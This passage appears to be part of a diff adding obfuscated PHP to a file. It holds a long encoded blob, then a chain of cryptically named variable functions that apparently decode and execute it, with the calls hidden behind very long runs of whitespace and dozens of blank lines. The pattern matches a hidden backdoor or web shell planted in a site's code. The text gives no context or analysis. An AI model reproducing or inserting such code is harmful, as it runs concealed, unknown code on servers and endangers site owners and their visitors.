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';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
